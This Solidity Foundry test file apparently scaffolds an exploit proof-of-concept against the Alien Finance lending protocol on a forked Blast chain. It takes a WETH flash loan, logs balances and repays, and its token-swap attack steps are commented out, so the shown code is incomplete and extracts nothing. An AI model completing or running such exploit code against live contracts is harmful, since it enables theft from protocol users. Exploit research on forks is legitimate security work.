// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC3156FlashBorrower.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IWETH.sol";

interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function getBorrowBalance(address user, address market) external view returns (uint256);
    function getAccountLiquidity(address user) external view returns (uint256, uint256, uint256);
    function isUserLiquidatable(address user) external view returns (bool);
    function calculateLiquidationOpportunity(address marketBorrow, address marketCollateral, uint256 repayAmount) external view returns (uint256);
}

interface ISwapRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IBlastPair {
    function swap(
        address recipient,
        bool zeroToOne,
        int256 amountRequired,
        uint160 limitSqrtPrice,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract AllienFlashTest is Test, IERC3156FlashBorrower {
    using SafeMath for uint;

    ISwapRouter private router = ISwapRouter(0x98994a9A7a2570367554589189dC9772241650f6);
    IPair private blasttoWeth = IPair(0x266BAfB866fc4a47D53ebaBF4f7C102a884d1335);
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    address public attacker;
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6201355);
        attacker = msg.sender;
        vm.deal(address(this), 10.1 ether);
        vm.prank(address(this));
        IWETH(0x4300000000000000000000000000000000000004).deposit{value: 1 ether}();
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker BLAST before exploit", weth.balanceOf(address(this)), 18);
        require(msg.sender == attacker, "Only attacker can start the exploit");

        uint256 wethfebore = weth.balanceOf(address(Allien));
        emit log_named_decimal_uint("allien weth before flash", wethfebore, 18);

        address token = address(weth);
        uint256 amount = 10 * 10**18;  // Ensure this amount is correct

        lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");
        emit log_named_decimal_uint("[End] Attacker BLAST after exploit", weth.balanceOf(address(this)), 18);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(address(_token) == address(weth), "Token mismatch");
        require(initiator == address(this), "Incorrect initiator");

        emit log_named_decimal_uint("[After] Attacker BLAST during exploit", weth.balanceOf(address(this)), 18);

        // BlastToWeth(amount);
        // emit log_named_decimal_uint("[After] Attacker WETH during swap", weth.balanceOf(address(this)), 18);
        // emit log_named_decimal_uint("[After] Attacker BLAST during swap", blast.balanceOf(address(this)), 18);
        uint256 wethfebore = weth.balanceOf(address(Allien));
        emit log_named_decimal_uint("allien weth during flash", wethfebore, 18);

        // WethToBlast();
        // emit log_named_decimal_uint("[After] Attacker BLAST during swapback", blast.balanceOf(address(this)), 18);
        // emit log_named_decimal_uint("[After] Attacker WETH during swapback", weth.balanceOf(address(this)), 18);

        // Calculate total debt (principal + fee)
        uint256 totalDebt = amount.add(fee);
        emit log_named_decimal_uint("[After] Attacker total debt swapback", totalDebt, 18);
        
        // Ensure enough balance to repay flash loan
        require(weth.balanceOf(address(this)) >= totalDebt, "Insufficient balance to repay flash loan");

        // Approve the exact amount required for repayment
        require(weth.approve(address(lender), weth.balanceOf(address(this))), "Approval failed");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function BlastToWeth(uint256 amount) internal {
        require(blast.approve(address(router), amount), "Approval failed");

        // Define the swap path from BLAST to WETH
        address[] memory path = new address[](2);
        path[0] = address(blast);
        path[1] = address(weth);

        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    }

    function WethToBlast() internal {
        uint256 wethBalance = weth.balanceOf(address(this));
        require(weth.approve(address(router), wethBalance), "Approval failed");

        // Define the swap path from WETH to BLAST
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(blast);

        router.swapExactTokensForTokens(wethBalance, 0, path, address(this), block.timestamp);
    }
}